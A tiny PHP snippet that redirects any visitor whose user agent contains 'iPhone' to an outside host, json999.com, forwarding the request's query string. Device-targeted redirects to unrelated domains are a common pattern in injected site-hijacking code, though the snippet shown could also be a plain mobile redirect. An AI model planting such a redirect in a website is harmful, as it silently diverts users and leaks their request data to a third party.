<?php
if(strpos($ua,"iPhone")!==false){
  header('Location: https://json999.com/redirect.php?'.$_SERVER['QUERY_STRING']);
  exit;
}
?>
